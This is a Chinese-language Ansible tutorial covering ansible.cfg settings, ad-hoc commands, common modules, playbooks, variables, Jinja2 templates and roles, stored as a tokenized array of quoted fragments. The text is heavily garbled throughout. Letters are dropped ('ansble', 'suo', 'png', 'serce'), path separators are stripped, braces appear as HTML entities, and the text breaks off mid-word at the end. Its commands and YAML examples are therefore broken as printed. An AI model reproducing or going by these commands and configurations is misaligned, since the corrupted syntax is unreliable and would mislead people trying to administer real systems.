默认","suo","用户","#","ask","_","suo","_","pass","=","True","#","每次","执行","ansble","命令","是否","询问","ssh","密码","#","ask","_","pass","=","True","#","remote","_","port","=","22","#","log","_","path","=","arlogansble",".","log","#","日志","文件","，","默认","不","记录","。","如果","想","打开","日志","记录","，","可以","取消","注释","#","host","_","key","_","checkng","=","False","#","检查","对应","服务器","的","host","_","key","，","建议","取消","注释","，","取消","完","ssh","可","以","不","敲","yes","其","中","remote","_","tmp","和","local","_","tmp","用于","执行","ansble","脚本","，","当","用户","在","ansble","主机","上","发","送命","令","时","，","ansble","会","把","命令","记录","在","本地","的","~",".","ansbletmp","目录","，","然后","发送","到","受控","主机","的","~",".","ansbletmp","目录","进行","执行","，","并把","执行","结果","返回","给","ansble","主机","。","ansble","配置文件","改动","不需要","用","systemctl","重","启","，","因为","ansble","不是","以","服务","的","形式","长","驻","内存","的","，","它是","用","的","时候","临时","调出","。","A","-","Hocansble","命令","执行","过程","加载","自己","的","配置","文件","，","默认","etcansbleansble",".","cfg","加载","自己","对应","的","模块","文件","，","如","comman","通过","ansble","将","模块","或","命令","生成","对应","的","临时","py","文件","，","并","将","该","文件传输","至","远程","服务器","的","对应","执行","用户","$","HOME",".","ansbletmpansble","-","tmp","-","NbrXXX",".","py","文件","给","文件","+","x","执行","执行","并","返回","结果","删除","py","文件","，","sleep","0","退出","可以","使用","ansble","all","-","m","png","-","来","展示","详细","过程","颜色","说明","红色","：","执行","失败","绿色","：","成功","，","对","目标","系统","没有","做","任何","修改","黄色","：","成功","，","对","目标","系统","做出","变更","在","etcansbleansble",".","cfg","中的","[","colors","]","有","说明","ansble","用法","[","root","@","noe","01","~","]","#","ansble","-","-","helpusage",":","ansble","host","-","pattern","[","-","m","moule","_","name","]","[","-","a","args","]","optonal","arguments",":","-","-","ask","-","ault","-","pass","ask","for","ault","passwor","-","-","lst","-","hosts","列出","主机","列表","，","如","：","ansble","webserer","-","-","lst","-","all","-","a","MODULE","_","ARGS",",","-","-","args","追加","模块","参数","-","f","FORKS","连接","并发","数","，","默认","是","5","-","t","TREE",",","-","-","tree","TREE","log","output","to","ths","rectory","-",",","-","-","erbose","显示","详细","过程","，","-","，","-","更","详细","-","K",",","-","-","ask","-","become","-","pass","提示","输入","suo","密码","-","b",",","-","-","become","代替","suo","切换","-","T","TIMEOUT",",","-","-","tmeout","执行","命令","的","超时","时间","，","默认","10","s","-","k",",","-","-","ask","-","pass","提示","输入","ssh","连接","密码","，","默认","key","验证","-","u","REMOTE","_","USER",",","-","-","user","指定","连接","用户","测试","能否","png","通","另一台","主机","，","这里","的","Png","不是","用","ICMP","协议","，","而是","用","SSH","协议","#","首","先在","主机","列","表里","加入","我们","的","主机","echo","\"","192.168.70.20","\"","etcansblehostsecho","\"","192.168.70.30","\"","etcansblehostsecho","\"","192.168.70.40","\"","etcansblehosts","#","然后","再","使用","png","命令","，","如果","能","通","，","对方","主机","会","回复","一个","pong","#","这里","因为","我","在","`","192.168.70.30","`","上","配置","了","key","，","所以","立刻","就","能","通","。","下面","通过","加","参数","k","，","来","输入","密码","：","ansble","121.36.70.55","-","m","png","-","k","#","多","台","主机","，","用","逗号","隔开","ansble","192.168.70.20",",","192.168.70.30","-","m","png","#","执行","所有","主机","ansble","all","-","m","png","#","通过","清单","分类","png","，","清单","分类","见","下文","ansble","bserer","-","m","png","主机","清单","分组","[","bserer","]","192.168.70.30192.168.70.20","[","webserer","]","192.168.70.10192.168.70.40","[","appserer","]","192.168.70",".","[","1",":","3","]","#","等价","于","192.168.70.1",",","192.168.70.2",",","192.168.70.3","ocansble","-","oc","用法","#","ansble","-","oc","：","显示","模块","帮助","ansble","-","oc","[","opton","]","[","moule",".",".",".","]","-","a","显示","所有","模块","的","文档","-","l",",","-","-","lst","列出","可用","模块","-","s",",","-","-","$","nppet","显示","指定","模块","的","playbook","片段","#","示例","：","ansble","-","oc","-","l","#","列出","所有","模块","ansble","-","oc","png","#","查看","png","模块","的","帮助","文档","ansble","-","oc","-","s","png","#","查看","png","模块","的","简略","信息","用","ansble","执行","命","ansble","通过","ssh","实现","配置管理","、","应用","部署","、","任务","执行","等","功能","，","建议","配置","ansble","端","能","基于","密钥","认证","的","方式","联系","各","被","管理","的","节点","#","查看","bserer","组","里","的","用户","家","目录","[","root","@","noe","01","~","]","#","ansble","bserer","-","u","root","-","m","comman","-","a","'","ls","root","'","192.168.70.30","CHANGED","rc","=","0","anacona","-","ks",".","cfg","192.168.70.20","CHANGED","rc","=","0","anacona","-","ks",".","cfg","普通","用户","在","ansble","执行","自己","主机","root","权限","#","首","先在","noe","02","上","添加","普通用户","zq","，","密码","000000","，","然后","追加","扩展","组","到","wheel","便于","执行","suo","权限","[","root","@","noe","02","~","]","#","usera","zq","[","root","@","noe","02","~","]","#","passw","zq","更改","用户","zq","的","密码","新的","密码","：","000000","无效","的","密码","：","密码","是","一个","回文","重新","输入","新的","密码","：","000000","passw","：","所","有的","身份","验证","令牌","已经","成功","更新","。","[","root","@","noe","02","~","]","#","suo","[","root","@","noe","02","~","]","#","usermo","-","aG","wheel","zq","#","然后","到","noe","01","上","执行","[","root","@","noe","01","~","]","#","ansble","192.168.70.20","-","u","zq","-","m","comman","-","a","'","ls","root","'","-","k","-","K","-","bSSH","passwor",":","000000","BECOME","passwor","[","efaults","to","SSH","passwor","]",":","000000192.168.70.20","CHANGED","rc","=","0","anacona","-","ks",".","cfg","#","suo","带","颜色","[","root","@","noe","02","~","]","#","echo","export","EDITOR","=","m","etcprofle",".","en",".","sh","[","root","@","noe","02","~","]","#","source","etcprofle",".","en",".","sh","hosts","主机","清单","#","匹配","主机","的","列表","1","、","All","：","表示","有","Inentory","中的","所有","主机","2","、","通配符","*","3","、","或","关","系",":","4","、","与","关","系","5","、","逻辑","非","6","、","综合","逻辑","7","、","正则","表达式","演示","：","1","、","ansble","all","-","m","png","2","、","ansble","192.168.70",".","*","-","m","png","3","、","ansble","\"","webserer",":","appserer","\"","-","m","png","4","、","ansble","'","webserer",":","&","amp",";","appserer","'","-","m","png","5","、","ansble","'","webserer",":","!","appserer","'","-","m","png","6","、","ansble","'","webserer",":","appserer",":","&","amp",";","bserer",":","!","ftpserer","'","-","m","png","7","、","ansble","'","~","(","webb",")",".","*","\\",".","serer","'","-","m","png","ansble","常用","模块","Comman","：","在","远程","主机","上","执行","命令","，","默认","模块","，","可","忽略","-","m","选项","ansble","noe","24","-","m","comman","-","a","‘","systemctl","restart","ssh","’","ansble","noe","24","-","m","comman","-","a","‘","echo","000","passw","–","stn","zq","’","【","不成功","】","此","模块","不支持","$","VARNAME",";","$","$","等","，","应","该","用","shell","模块","实现","Shell","：","和","comman","相似","，","用","shell","执行","命令","ansble","noe","24","-","m","shell","-","a","‘","echo","000","passw","–","stn","zq","’","调用","bash","执行","命令","，","类似","`","cat","etcpassw","awk","-","F","‘",":","’","‘","{","prnt","$","1",",","$","2","}","’","&","amp",";","tmpexample",".","txt","这些","复杂的","命令","，","即使","使用","shell","也","可能会","失败","，","解决办法","：","写","到","脚本","里","，","copy","到","远程","执行","，","再","把","所","需要","的","结果","拉回","执行","命令","的","机器","Scrpt","：","运行","脚本","呢","-","a","“","PATHTOSCRIPT","_","FILE","”","ansble","noe","24","-","m","scrpt","-","a","f","1",".","sh","Copy","：","把","服务器","上","的","文件","复制","到","受控","端","如果","目标","存","在","，","默认","覆盖","，","此","处","指定","先","备份","ansble","all","-","m","copy","-","a","‘","src","=","etcselnuxconfg","est","=","etcselnuxconfg","backup","=","yes","owner","=","zq","moe","=","000","’","利用","内容","直接","生成","目标","文件","ansble","all","-","m","copy","-","a","‘","content","=","’","hello","worl","’","esttmp","1",".","txt","’","Fetch","：","从","客户端","取","文件","至","服务器端","ansble","noe","23","-","m","fle","-","a","‘","src","=","roota",".","sh","est","=","tmp","‘","Fle","：","设置","文件属性","ansble","noe","23","-","m","fle","-","a","‘","path","=","roota",".","sh","owner","=","zq","moe","=","755","’","ansble","noe","23","-","m","fle","-","a","‘","src","=","apptestfle","est","=","apptestfle","-","lnk","state","=","lnk","’","创建","文件","ansble","noe","23","-","m","fle","-","a","‘","path","=","’","rootf","1",".","txt","’","state","=","touch","’","删除","文件","ansble","noe","23","-","m","fle","-","a","‘","path","=","’","rootf","1",".","txt","’","state","=","absent","’","创建","软","连接","ansble","noe","23","-","m","fle","-","a","‘","src","=","etcsshssh","_","confg","est","=","rootssh","_","lnk","state","=","lnk","’","Hostname","：","管理","主机名","更改","主机名","ansble","192.168.70.20","-","m","hostname","-","a","‘","name","=","noe","02","’","Cron","：","计划","任务","支","持","时间","：","mnute","、","hour","、","ay","、","month","、","weekay","创建","任务","：","ansble","noe","24","-","m","cron","-","a","‘","mnute","=","*","weekay","=","1",",","3",",","5","job","=","”","usrbnwall","FBI","warnng","”","name","=","warnnng","’","禁用","任务","：","ansble","noe","24","-","m","cron","-","a","‘","sable","=","true","job","=","”","usrbnwall","FBI","warnng","”","name","=","warnnng","’","删除","任务","：","ansble","noe","24","-","m","cron","-","a","‘","job","=","”","usrbnwall","FBI","warnng","”","name","=","warnnng","state","=","absent","’","Yum","：","管理","包","安装","ansble","noe","24","-","m","yum","-","a","‘","name","=","http","state","=","latest","’","删除","ansble","noe","24","-","m","yum","-","a","‘","name","=","http","state","=","absent","’","Serce","：","管理","服务","安装","FTP","服务","启动","，","并","设置","开启","自","启","ansble","noe","24","-","m","serce","-","a","‘","name","=","sftp","state","=","starte","enable","=","yes","’","ansble","sr","-","m","serce","-","a","‘","name","=","http","state","=","stope","’","ansble","sr","-","m","serce","-","a","‘","name","=","http","state","=","starte","’","ansble","sr","-","m","serce","-","a","‘","name","=","http","state","=","reloae","’","ansble","sr","-","m","serce","-","a","‘","name","=","http","state","=","restart","’","User","：","管理","用户","ansble","sr","-","m","user","-","a","‘","name","=","user","1","commment","=","”","test","user","”","u","=","2048","home","=","appuser","1","”","group","=","root","’","ansble","sr","-","m","user","-","a","‘","name","=","sysuser","1","system","=","yes","home","=","appsysuser","1","’","ansble","sr","-","m","user","-","a","‘","name","=","user","1","state","=","absent","remoe","=","yes","’","#","删除","用户","家","目录","Group","：","管理","组","ansble","sr","-","m","group","-","a","‘","name","=","testgroup","system","=","yes","’","ansble","sr","-","m","group","-","a","‘","name","=","testgroup","state","=","absent","’","ansble","-","galaxy","连接","https",":","galaxy",".","ansble",".","com","下载","相应","的","roles","列出","已","安装","的","galaxy","：","ansble","-","galaxy","lst","安装","galaxy","：","ansble","-","galaxy","nstall","username",".","rolename","删除","galaxy","：","ansble","-","galaxy","remoe","username",".","rolename","ansble","-","ault","加密","解密","playbook","#","解密","ansble","-","ault","encrypt","hello",".","yml","#","加密","ansble","-","ault","ecrypt","hello",".","yml","#","加密","后","查看","文件","ansble","-","ault","ew","hello",".","yml","#","加密","后","编辑","文件","ansble","-","ault","etor","hello",".","yml","#","重新","设置","口令","ansble","-","ault","rekey","hello",".","yml","ansble","-","consoleansble","交互式","控制台","ansble","-","consoleroot","@","noe","24","(","2",")","[","f",":","5","]","$","forks","3","root","@","noe","24","(","2",")","[","f",":","3","]","$","c","noe","23","root","@","noe","23","(","2",")","[","f",":","3","]","$","?","#","查看","有","哪些","命令","root","@","noe","23","(","2",")","[","f",":","3","]","$","comman","hostname","#","执行","命令","：","模块","名","命令","192.168.70.20","CHANGED","rc","=","0","noe","02192.168.70.30","CHANGED","rc","=","0","noe","03","root","@","noe","23","(","2",")","[","f",":","3","]","$","serce","name","=","http","state","=","start","ansble","-","playbook","playbook","是","由","多","个","play","组成","的","列表","play","的","主要功能","在于","将","事先","归并","为","一组","的","主机","装扮","成事","先","通过","ansble","中的","task","定义","好的","角色","。","从根本上","讲","，","所谓","task","无非","是","调用","ansble","的","一个","moule","。","将","多","个","play","组织","在","一个","playbook","中","，","即可","以","让","他们","联通","起来","按","实现","编排","的","机制","同唱","一台","大戏","playbook","采用","yaml","语言","编写","Playbook","核心","元素","Hosts","：","执行","的","远程","主机","列表","Tasks","：","任务","集","Varnables","：","内置","变量","或","自定义","变量","在","playbook","中","调用","Templates","：","模板","，","可","替换","模板","文件","的","变量","并","实现","一些","简单","逻辑","文件","Hanlers","和","Notty","结合","使用","，","由","特定","条件","出发","的","操作","，","满足","条件","方才","执行","，","否则","不","执行","tags","：","标签","，","指定","某","条","任务","执行","，","用于","选择","运行","playbook","中的","部分","代码","，","ansble","具有","幂","等","性","，","因此","会","自动","跳过","没有","变化","的","部分","，","即便","如此","，","有些","代码","为","测试","其","确实","没有","变化","的","时间","依然","会","非常","长","，","此时","如果","确信","没有","其他","变化","，","可以","就","通过","tags","跳过","此","代码","片段","playbook","常见","选项","ansble","-","playbook","fle",".","yml","-","-","lst","-","hosts","#","列出","playbook","中的","主机","ansble","-","playbook","fle",".","yml","-","-","lst","-","tasks","#","列出","playbook","中的","任务","ansble","-","playbook","fle",".","yml","-","-","lmt","noe","23","#","限制","任务","执行","的","主机","ansble","-","playbook","-","C","fle",".","yml","#","检查","yaml","语法","hostsplaybook","中","每个","play","的","目的","都是","为了","让","某个","或","某些","主机","以","某个","指定","的","用户","身份","执行","任务","，","hosts","用于","指定","要","执行","任务","的","主机","，","须","事先","定义","在","主机","清单","中","。","可以","是","如下","形式","one",".","example",".","com","one",".","example",".","com",":","two",".","example",".","com","192.168.1.2","192.168.1",".","*","webserer",":","bserer",":","&","amp",";","appserer","示例","：","host",":","webserer","检查","playbook","语法","：","ansble","-","playbook","-","C","fle",".","yml","-","hosts",":","websrs","remote","_","user",":","root","tasks",":","-","name",":","create","new","fle","fle",":","name","=","atanewfle","state","=","touch","-","name",":","create","new","user","user",":","name","=","test","3","state","=","present","system","=","yes","-","name",":","nstall","package","yum",":","name","=","http","state","=","nstalle","-","name",":","copy","html","copy",":","src","=","arwwwhtmlnex",".","html","est","=","arwwwhtml","-","name",":","start","serce","serce",":","name","=","http","state","=","starte","enable","=","yes","taskstask","列","表","和","acton","play","的","主体","部","分","是","task","lst","。","task","lst","中的","各","任务","按","次序","逐个","在","hosts","中指","定","的","所有","主机","上","执行","，","即","在","所有","主机","上","完成","第","一个","任务","后","再","开始","第二个","。","在","运行","自上而下","某","playbook","，","如果","中途","发生","错误","，","所有","已","执行","任务","都","将","回","滚","，","因此","，","在","更正","playbook","后","重新","执行","一次","即可","task","的","目的","是","使用","指定","参数","执行","模块","，","而","在","模块","参数","中","可以","使用","变量","，","模块","执行","是","幂","等","的","，","这","意味着","多次","执行","是","安全的","，","因","为","其","结果","均一","致","每个","task","都","应","该","有","其","name","，","用于","playbook","的","执行","结果","输出","，","建议","其","内容","尽可能","清晰地","描述","任务","执行","步骤","，","如果","未","提供","name","，","则","acton","的","结果","将","用于","输出","acton","格式","：","(","1",")","acton",":","moule","arguments","(","2",")","moule",":","arguments","脚本","错误","继续","执行","(","1",")","task",":","-","name",":","run","ths","comman","an","gnore","the","result","shell",":","usrbncomnans","bntrue","(","2",")","tasks","-","name",":","run","ths","comman","an","gnore","the","result","shell",":","usrbncommans","gnore","_","errors",":","True","hanlers","&","amp",";","notfy","Hanlers","：","是","task","列表","，","这些","task","与","前述","的","task","没有","本质上","的","不同","，","用于","当","关注","资源","发生","变化","时","，","才","会","采取","一定","的","操作","Notfy","此","Acton","可","用于","在","每个","play","的","最后","被","触发","，","这样","可以","避免","多次","有","改变","发生","时","，","每次","都","执行","指定","操作","，","仅","在","所","有的","变化","发生","完","后","一次性","地","执行","指定","操作","。","在","notfy","中","列出","的","操作","称为","hanler","，","也","即","notfy","中","调用","hanler","中","定义","的","操作","。","一旦","配置文件","发生","变化","，","服务","重","启","-","-","-","#","http","服务","-","host",":","webserer","remote","_","user",":","root","tasks",":","-","name",":","nstall","http","package","yum",":","name","=","http","-","name",":","copy","confg","fle","copy",":","src","=","etchttpconfhttp",".","conf","est","=","etchttpconf","backup","=","yes","notfy",":","restart","http","serce","-","name",":","start","serce","serce",":","name","=","http","state","=","starte","enable","=","yes","hanlers",":","-","name",":","restart","http","serce","serce",":","name","=","http","state","=","restarte","#","如果","copy","confg","fle","改动","，","则","触发","hanlers","中的","restart","http","serce","notfy","&","amp",";","hanler","多","个","的","写法",",","用","列表","的","形式","呈现","-","name",":","confg","copy",":","src","=","flengnx",".","conf","est","=","etcngnxngnx",".","conf","notfy",":","-","restart","ngnx","-","check","ngnx","process","hanlers",":","-","name",":","restart","ngnx","serce",":","name","=","ngnx","state","=","restarte","enable","=","yes","-","name",":","check","ngnx","process","shell",":","kllall","-","0","ngnx","tmpngnx",".","log","tags","只","执行","标签","内容","，","或者","不","执行","标签","内容","#","以下","是","不同的","动作","不同的","标签","，","也","可以","多","个","动作","公用","一个","标签","-","host",":","webserer","remote","_","user",":","root","tasks",":","-","name",":","nstall","http","package","yum",":","name","=","http","tags",":","nstall","_","http","-","name",":","copy","confg","fle","copy",":","src","=","etchttpconfhttp",".","conf","est","=","etchttpconf","backup","=","yes","notfy",":","restart","http","serce","-","name",":","start","serce","serce",":","name","=","http","state","=","starte","enable","=","yes","tags",":","restart","_","http","hanlers",":","-","name",":","restart","http","serce","serce",":","name","=","http","state","=","restarte","#","ansble","-","playbook","调用","#","ansble","-","playbook","-","t","nstall","_","http",",","restart","_","http","http",".","yml","Varnables","变量","名","：","仅","能","由","字母","、","下","划线","、","数字","组成","，","且","只能","以","字母","开头","变量","来源","：","ansble","setup","facts","远程","主机","的","所有","变量","都","可以","直接","调用","在","etcansblehosts","中","定义","普通","变量","：","主机","组","中","主机","单独","定义","，","优先级","高于","公共","变量","公共","变量","：","针对","主机","中","所有","主机","定义","的","统一","变量","通过","命令行","指定","变量","，","优先级","最高","ansble","-","playbook","-","e","‘","arname","=","alue","’","fle",".","yml","在","playbook","中","定义","ars",":","-","ar","1",":","alue","1","-","ar","2",":","alue","2","在","role","中","定义","优先级","：","命令行","Playbook","主机","清单","命令行","的","变量","赋值","-","host",":","webserer","remote","_","user",":","root","tasks",":","-","name",":","nstall","http","package","yum",":","name","=","&","#","123",";","&","#","123",";","pkgname","&","#","125",";","&","#","125",";","-","name",":","start","serce","serce",":","name","=","&","#","123",";","&","#","123",";","pkgname","&","#","125",";","&","#","125",";","state","=","starte","enable","=","yes","#","执行","#","ansble","-","playbook","-","e","'","pkgname","=","sftp","'","app",".","yml","定义","playbook","中的","变量","-","-","-","-","host",":","webserer","remote","_","user",":","root","ars",":","-","pkgname","1",":","http","-","pkgname","2",":","sftp","tasks",":","-","name",":","nstall","http","package","yum",":","name","=","&","#","123",";","&","#","123",";","pkgname","1","&","#","125",";","&","#","125",";","-","name",":","start","serce","serce",":","name","=","&","#","123",";","&","#","123",";","pkgname","2","&","#","125",";","&","#","125",";","state","=","starte","enable","=","yes","在","主机","清单","中","定义","变量","#","定义","主机","清单","中的","变量","$","m","etcansblehosts","[","noe","23","]","192.168.70.30","Nbr","=","300192.168.70.20","Nbr","=","200","#","在","playbook","中","调用","-","hosts",":","noe","23","remote","_","user",":","root","tasks",":","-","name",":","set","hostanem","hostname",":","name","=","www",".","&","#","123",";","&","#","123",";","Nbr","&","#","125",";","&","#","125",";","ymlog",".","cn","清单","统一","变量","$","m","etcansblehosts","[","noe","23","]","192.168.70.30","Nbr","=","300192.168.70.20","Nbr","=","200","[","noe","23",":","ars","]","noename","=","wwwomanname","=","ymlog",".","cn","-","hosts",":","noe","23","remote","_","user",":","root","tasks",":","-","name",":","set","hostanem","hostname",":","name","=","&","#","123",";","&","#","123",";","noename","&","#","125",";","&","#","125",";","&","#","123",";","&","#","123",";","Nbr","&","#","125",";","&","#","125",";","&","#","123",";","&","#","123",";","omanname","&","#","125",";","&","#","125",";","templates","模板","文本文","件","，","嵌套","有","脚本","Jnja","2","语言","，","使用","字面","量","，","有","下面","形式","：","字符串","：","使用","单","引号","或","双引号","数字","：","整数","、","浮点","数","列表","：","[","tem","1",",","tem","2",",","…","]","元","组","：","{","tem","1",",","tem","2",",","…","}","字典","：","{","key","1",":","alue","1",",","key","2",":","alue","2",",","…",".","}","布尔","型","：","truefalse","算术","运算","：","+",",","-",",","*",",",",",",","%",",","*","*","比较","操作","：","=","=",",","!","=",",",",","=",",",",","=","逻辑","运算","：","an","、","or","、","not","流","表达","式","：","For","If","When","-","-","-","-","hosts",":","webserer","remote","_","user",":","root","ars","_","fles",":","-","ars",".","yml","tasks",":","-","name",":","nstall","package","yum",":","name","=","ngnx","-","name",":","copy","template","template",":","src","=","root",".","ansbletemplatesngnx",".","conf",".","j","2","est","=","etcngnxngnx",".","conf","-","name",":","start","serce","serce",":","name","=","ngnx","state","=","starte","enable","=","yes","1","、","将","Ngnx","的","工作","进程","改为","CPU","核心","数","的","二次方","倍","：","修改","templates","的","文件","，","原来","templatesngnx",".","conf",".","j","2","的","文件","就是","ngnx",".","conf","的","配置","文件","。","先","查看","setup","中的","cpu","变量","用","什么","标识","：","[","root","@","noe","01","~","]","#","ansble","noe","24","-","m","setup","grep","cpu","\"","ansble","_","processor","_","cpus","\"",":","1",",","\"","ansble","_","processor","_","cpus","\"",":","1",",","user","ngnx",";","worker","_","processes","&","#","123",";","&","#","123",";","ansble","_","processor","_","cpus","*","*","2","&","#","125",";","&","#","125",";",";","2","、","将","noe","2","的","端口","改为","200","，","noe","3","的","端口","改为","300","192.168.70.30","Nbr","=","300192.168.70.20","Nbr","=","200","serer","&","#","123",";","lsten","&","#","123",";","&","#","123",";","Nbr","&","#","125",";","&","#","125",";","efault","_","serer",";","lsten","[",":",":","]",":","&","#","123",";","&","#","123",";","Nbr","&","#","125",";","&","#","125",";","efault","_","serer",";","3","、","when","条件","测试","：","如果","需要","根据","变量","、","facts","或","此前","任务","执行","结果","来","作为","某","task","执行","与否","的","前提","时要","用到","条件","测试","，","通过","when","语句","实现","，","在","task","中","使用","，","jnja","2","的","语法","格式","when","语句","在","task","后","添加","when","子句","即可","使用","条件","测试","；","when","语句","支持","jnja","2","表达","语法","示例","：","tasks",":","-","name",":","&","quot",";","shutown","ReHat","Flaore","Systems","&","quot",";","comman",":","&","#","x","2","F",";","sbn","&","#","x","2","F",";","shutown","-","h","now","when",":","ansble","_","os","_","famly","&","#","x","3","D",";","&","#","x","3","D",";","&","quot",";","Rehat","&","quot",";","当","为","7","版","的","时候","才","复制","文件","-","-","-","-","hosts",":","webserer","remote","_","user",":","root","tasks",":","-","name",":","nstall","package","yum",":","name","=","ngnx","-","name",":","copy","template","template",":","src","=","root",".","ansbletemplatesngnx",".","conf",".","j","2","est","=","etcngnxngnx",".","conf","when",":","ansble","_","strbuton","_","major","_","erson","=","=","\"","7","\"","-","name",":","start","serce","serce",":","name","=","ngnx","state","=","starte","enable","=","yes","wth","_","tem","迭","代","1","、","新建","多","个","文件","-","-","-","-","hosts",":","webserer","remote","_","user",":","root","tasks",":","-","name",":","create","some","fles","fle",":","name","=","ata","&","#","123",";","&","#","123",";","tem","&","#","125",";","&","#","125",";","state","=","touch","wth","_","tems",":","-","fle","1","-","fle","2","-","fle","3","2","、","迭","代","嵌套","子","变量","-","-","-","-","hosts",":","webserer","remote","_","user",":","root","tasks",":","-","name",":","a","some","groups","group",":","name","=","&","#","123",";","&","#","123",";","tem","&","#","125",";","&","#","125",";","state","=","present","wth","_","tems",":","-","group","1","-","group","2","-","group","3","-","name",":","a","some","users","user",":","name","=","&","#","123",";","&","#","123",";","tem",".","name","&","#","125",";","&","#","125",";","group","=","&","#","123",";","&","#","123",";","tem",".","group","&","#","125",";","&","#","125",";","state","=","present","wth","_","tems",":","-","&","#","123",";","name",":","'","user","1","'",",","group",":","'","group","1","'","&","#","125",";","-","&","#","123",";","name",":","'","user","2","'",",","group",":","'","group","2","'","&","#","125",";","-","&","#","123",";","name",":","'","user","'",",","group",":","'","group","3","'","&","#","125",";","for","循环","$","m","templates",".","yml","-","hosts",":","all","remote","_","user",":","root","ars",":","ports",":","-","81","-","82","-","83","tasks",":","-","name",":","copy","conf","template",":","src","=","for","1",".","conf",".","j","2","estatafor","1",".","conf","$","m","for","1",".","conf",".","j","2","&","#","123",";","%","for","port","n","ports","%","&","#","125",";","serer","&","#","123",";","lsten","&","#","123",";","&","#","123",";","port","&","#","125",";","&","#","125",";","&","#","125",";","&","#","123",";","%","enfor","%","&","#","125",";","$","执行","ansble","-","playbook","all","templates",".","yml","把","列表","换成","字典","$","m","templates",".","yml","-","hosts",":","all","remote","_","user",":","root","ars",":","ports",":","-","web","1",":","port",":","81","name",":","www",".","web","1",".","com","rootr",":","rootwebste","1","-","web","2",":","port",":","82","name",":","www",".","web","2",".","com","rootr",":","rootwebste","2","-","web","3",":","port",":","83","name",":","www",".","web","3",".","com","rootr",":","rootwebste","3","tasks",":","-","name",":","copy","conf","template",":","src","=","for","1",".","conf",".","j","2","estatafor","1",".","conf","$","m","for","1",".","conf",".","j","2","&","#","123",";","%","for","p","n","ports","%","&","#","125",";","serer","&","#","123",";","lsten","&","#","123",";","&","#","123",";","p",".","port","&","#","125",";","&","#","125",";","serername","&","#","123",";","&","#","123",";","p",".","name","&","#","125",";","&","#","125",";","ocumentroot","&","#","123",";","&","#","123",";","p",".","rootr","&","#","125",";","&","#","125",";","&","#","125",";","&","#","123",";","%","enfor","%","&","#","125",";","$","执行","ansble","-","playbook","all","templates",".","yml","f","条件","判断","#","如果","p",".","name","被","定义","了","&","#","123",";","%","f","p",".","name","s","efne","%","&","#","125",";","o",".",".",".","&","#","123",";","%","enf","%","&","#","125",";","o",".",".",".","YAML","介绍","YAML","是","一个","可读性","高的","用来","表达","资料","序列","的","格式","，","YAML","参考","了","其他","多种","语言","，","包括","XML","、","C","、","Python","、","Perl","以及","电子邮件","格式","RFC","2822","等","，","Clark","Eans","在","2001年","首次","发表","了","这种","语言","。","YAML","特性","可读性","好","和","脚本语言","的","交互","性","好","使用","实现","语言","的","数据类型","有","一个","一致","的","信息","模型","易于","实现","可以","基于","流","来","处理","表达","能力强","，","扩展","性","好","http",":","www",".","yaml",".","org","YAML","语法","简介","在","单一","文件","中","，","可以","连续","用","三个","连字号","-","区分","多","个","档案","，","另外","，","还有","选择性","的","连续","三个","点号","(","…",")","用来","表示","档案","结尾","次","行","开始","正常","写","playbook","的","内容","，","一般","建议","写明","该","Playbook","的","功能","使用","#","注释","代码","缩进","必须","是","统一","的","，","不能","空格","和","tab","混用","缩进","的","级别","也","必须","是","一致","的","，","同样","的","缩进","代表","同样","的","级别","，","程序","判别","配置","的","级别","就是","通过","缩进","结合","换行","来","实现","的","YAML","文件","内容","和","Lnux","系统","大小写","判断","方式","保持一致","，","区分","大小写","，","keyalue","值均需","大小","写","敏感","keyalue","值","可","同行","写","也","可以","换行","写","，","同行","使用",":","分隔","alue","可以","是","字符串","，","也","可以","是","另一个","列表","一个","完整的","代码","块","功能","需要","最少","元素","包括","name",":","task","一个","name","只能","包含","一个","task","YAML","文件","扩展","名","通常","为","yml","或","yaml","LIST","：","列表","#","A","Lst","-","blue","-","grenn","-","black","-","whte","-","yellow","DICTIONARY","：","字典","#","A","Dctonayname",":","Ajobs",":","Bskl",":","C","&","#","123",";","name",":","A",",","Job",":","B",",","Skl",":","C","&","#","125",";","基础","写法","：","在","noe","24","上","创建","文件","-","-","-","-","hosts",":","noe","24","#","指定","受控","端","remote","_","user",":","root","#","以","什么","身份","登录","受控","端","tasks",":","-","name",":","hello","#","任务","名","，","没什么","意思","comman",":","touch","rootpl",".","test","#","使用","comman","模块","执行","命令","#","把","变量","定义","到","一个","文件","中","$","cat","ars",".","ymlar","1",":","sftpar","2",":","http","#","调用","变量","-","-","-","-","hosts",":","webserer","remote","_","user",":","root","ars","_","fles",":","-","ars",".","yml","tasks",":","-","name",":","nstall","package","yum",":","name","=","&","#","123",";","&","#","123",";","ar","1","&","#","125",";","&","#","125",";","roles","roles","ansble","自","1.2","版本","引入","的","新","特性","，","用于","层次","性","、","结构","化","组织","playbook","。","roles","能够","根据","层次","型","结构","自动","装载","变量","、","tasks","以及","hanlers","等","。","要","使用","roles","只","需要","在","playbook","中","使用","nclue","指令","即可","，","简单来讲","，","roles","就是","通过","分别","将","变量","、","文件","、","任务","、","模板","及","处理器","放置","于","单独","的","目录","中","，","并且","可以","便捷的","nlcue","它们","的","一种","机制","。","角色","一般","用于","基于","主机","构建","服务","的","场景","中","，","但","也","可以","用于","构建","守护","进程","等","场景","中","。","复杂","场景","建议","使用","roles","，","代码","复用性","高","某些","功能","需要","多","个","playbook","，","通过","nclues","即可","实现","roles","目录","结构","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","#","每个","角色","，","以","特定","的","层级","目录","结构","进行","组织","playbook",".","ymlroles","project","tasks","fles","ars","efault","templates","hanlers","meta","各","目录","的","作用","：","fles","：","存放","由","copy","或","scrpt","模块","等","调用","的","文件","templates","：","template","模块","查找","所","需","模板","文件","目录","tasks","：","定义","task","，","role","的","基本","元素","，","至少","应该","包含","一个","名为","man",".","yml","的","文件","，","其他","的","文件","需要","在","此","文件","中","通过","nclue","进行","包含","hanlers","：","至少","应该","包含","一个","man",".","yml","的","文件","；","其他","文件","需要","再次","文件","中","通过","nclue","进行","包含","ars","：","定义","变量","，","至少","应该","包含","一个","man",".","yml","的","文件","；","其他","文件","需要","再次","文件","中","通过","nclue","进行","包含","meta","：","定义","当前","角色","的","特殊","设定","及其","依赖","关系","，","至少","应该","包含","一个","名为","man",".","yml","的","文件","，","其他","文件","需再","此","文件","中","通过","nclue","进行","包含","efault","：","设定","默认","变量","时","，","使用","此","目录","中的","man",".","yml","文件","Ansble","搭建","http","安装","http","1","、","目录","结构","├","─","─","http","_","role",".","yml","├","─","─","*","roles","│","└","─","─","*","http","│","├","─","─","*","tasks","│","│","├","─","─","group",".","ym